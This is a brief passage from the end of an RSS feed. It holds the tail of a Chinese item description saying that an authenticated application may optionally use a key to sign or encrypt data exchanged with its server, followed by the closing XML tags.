key。上层应用经过身份验证后，可以选择性的使用这个key对之后发往服务端或接收自身服务端的数据进行签名或加密&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
